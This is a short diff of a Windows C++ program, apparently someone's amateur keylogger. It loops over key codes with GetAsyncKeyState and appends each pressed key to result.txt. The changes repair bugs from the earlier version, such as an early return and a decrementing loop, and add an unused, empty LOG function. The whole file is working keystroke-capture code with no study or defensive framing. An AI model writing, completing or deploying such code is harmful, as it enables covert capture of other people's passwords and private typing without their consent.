@@ -1,27 +1,32 @@
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
+#define _WIN32_WINNT 0x0500
+#include <stdlib.h>
+#include <stdio.h>
 using namespace std;
 
-int Save(int key, const char *file) {
-    cout << key << endl;
-    FILE *OUTPUT_FILE;
-    OUTPUT_FILE = fopen(file, "a+");
-    fprintf(OUTPUT_FILE, "%s", &key);
-    fclose(OUTPUT_FILE);
-    return 0;
+void LOG(int key, const char *files) {
+    ofstream log;
+     log.open("log.txt");
+  
+
 }
 int main () {
-    return 0;
+    ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
+   
     char i;
-    cout << "HELLO" << endl;
-    return 0;
     while (true) {
-        for (i = 8; i < 255; i--) {
+        for (i = 8; i < 190; i++) {
             //if the button is pressed
             if(GetAsyncKeyState(i)== -32767){
-                Save(i,"result.txt");
-            }
+                fstream record;
+                record.open("result.txt", fstream::app);
+                if(record.is_open()) {
+                    record << (char)(i);
+                    record.close();
+                }
+             }
         }
     }
 }
